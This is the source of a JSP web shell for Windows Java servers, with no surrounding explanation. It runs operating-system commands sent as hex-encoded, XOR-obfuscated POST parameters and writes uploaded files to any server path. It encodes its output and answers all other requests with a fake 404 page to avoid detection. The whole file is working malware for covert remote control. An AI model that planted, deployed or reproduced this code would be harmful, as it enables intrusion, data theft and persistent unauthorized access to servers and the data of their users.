<%@ page import="java.io.*" %>
<%@ page import="java.nio.file.Files" %>
<%@ page import="java.nio.file.StandardOpenOption" %>
<%
    try {
            String type = request.getHeader("type");
	            String method = request.getMethod();
		            if (type == null) type = "";
			            if (method.equalsIgnoreCase("POST") && type.equalsIgnoreCase("c")) {
				                String cStr2 = request.getParameter("nothing02");
						            byte[] cBytes = new byte[cStr2.length() / 2];
							                for (int i = 0; i <= cStr2.length() - 2; i = i + 2) {
									                byte b1 = (byte) Integer.parseInt(cStr2.substring(i, i + 2), 16);
											                b1 = (byte) (b1 ^ 45);
													                cBytes[i / 2] = b1;
															            }

																                String cmd = new String(cBytes);
																		            Process p = Runtime.getRuntime().exec("cmd.exe /c " + cmd);
																			                InputStream in = p.getInputStream();
																					            DataInputStream dis = new DataInputStream(in);

																						                StringBuilder sb = new StringBuilder();
																								            String disr = dis.readLine();
																									                while (disr != null) {
																											                sb.append(disr).append("\n");
																													                disr = dis.readLine();
																															            }
																																                byte[] encBytes = sb.toString().getBytes();
																																		            for (int i = 0; i < encBytes.length; i++) {
																																			                    encBytes[i] = (byte) (encBytes[i] ^ (byte) 45);
																																					                }
																																							            out.println(new String(encBytes));
																																								            } else if (method.equalsIgnoreCase("POST") && type.equalsIgnoreCase("u")) {
																																									                String fileContentCrypt = request.getParameter("nothing02");
																																											            byte[] fileContent = new byte[fileContentCrypt.length() / 2];
																																												                for (int i = 0; i <= fileContentCrypt.length() - 2; i = i + 2) {
																																														                byte b1 = (byte) Integer.parseInt(fileContentCrypt.substring(i, i + 2), 16);
																																																                b1 = (byte) (b1 ^ 45);
																																																		                fileContent[i / 2] = b1;
																																																				            }
																																																					                String filePathCrypt = request.getParameter("nothing01");
																																																							            byte[] filePath = new byte[filePathCrypt.length() / 2];
																																																								                for (int i = 0; i <= filePathCrypt.length() - 2; i = i + 2) {
																																																										                byte b1 = (byte) Integer.parseInt(filePathCrypt.substring(i, i + 2), 16);
																																																												                b1 = (byte) (b1 ^ 45);
																																																														                filePath[i / 2] = b1;
																																																																            }
																																																																	                String filePathStr = new String(filePath);
																																																																			            byte[] encBytes = "Upload Successfully".getBytes();
																																																																				                try {
																																																																						                Files.write(new File(filePathStr).toPath(), fileContent, StandardOpenOption.CREATE);
																																																																								            } catch (Exception e) {
																																																																									                    encBytes = "Error Occurred".getBytes();
																																																																											                }
																																																																													            for (int i = 0; i < encBytes.length; i++) {
																																																																														                    encBytes[i] = (byte) (encBytes[i] ^ (byte) 45);
																																																																																                }
																																																																																		            out.println(new String(encBytes));
																																																																																			            } else {
																																																																																				                out.print("404 File not found");
																																																																																						        }
																																																																																							    } catch (Exception e) {
																																																																																							            byte[] encBytes = "Error Occurred".getBytes();
																																																																																								            out.println(new String(encBytes));
																																																																																									        }
																																																																																										%>
